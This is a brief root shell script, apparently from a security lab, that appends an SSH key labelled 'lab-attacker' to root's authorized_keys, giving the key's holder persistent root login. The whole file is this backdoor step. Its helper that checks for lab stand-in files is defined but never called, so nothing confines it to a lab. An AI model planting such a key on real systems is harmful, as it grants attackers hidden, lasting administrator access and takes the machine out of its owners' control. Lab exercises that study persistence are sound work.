#!/bin/sh
# Adds an SSH key to root's authorized_keys.
# Runs as root inside a lab machine. Stand-ins are expected in /lab/standins.
set -eu
SI=/lab/standins
need() { [ -e "$SI/$1" ] || { echo "$0: $SI/$1 is missing (copy the stand-ins in first)" >&2; exit 1; }; }
install -d -m 700 /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIEEHeD7aE8BzppJ7cPpeQnB7ZqgTT21bHJP6e40Gsq0 lab-attacker@nowhere' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
